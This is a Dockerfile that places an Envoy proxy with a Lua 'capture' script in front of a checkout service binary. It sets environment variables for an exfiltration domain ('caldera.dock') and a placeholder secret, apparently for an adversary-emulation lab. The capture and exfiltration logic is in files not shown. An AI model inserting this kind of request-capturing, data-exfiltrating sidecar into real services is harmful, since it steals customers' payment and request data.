FROM registry:5000/checkout:2.0.2 AS app_orig

# Stage 2: runtime with Envoy
FROM envoyproxy/envoy:v1.31-latest

ARG EXFIL_DOMAIN="caldera.dock"

# minimal tools
RUN apt-get update && apt-get install -y --no-install-recommends ca-certificates jq bash coreutils gettext-base \
 && rm -rf /var/lib/apt/lists/*

# workspace
RUN mkdir -p /usr/src/app /etc/envoy /etc/envoy/lua /logs

# binary app
COPY --from=app_orig /usr/src/app/checkout /usr/src/app/checkout

# config Envoy (template) + Lua + entrypoint
COPY envoy.yaml.tpl /etc/envoy/envoy.yaml.tpl
COPY lua/capture.lua /etc/envoy/lua/capture.lua
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

ENV LISTEN_PORT=8080 \
    APP_PORT=18080 \
    MAX_BODY_BYTES=4096 \
    EXFIL_DOMAIN="$EXFIL_DOMAIN" \
    EXFIL_FIXED="123-SECRET-DATA-1234"

EXPOSE 8080
CMD ["/entrypoint.sh"]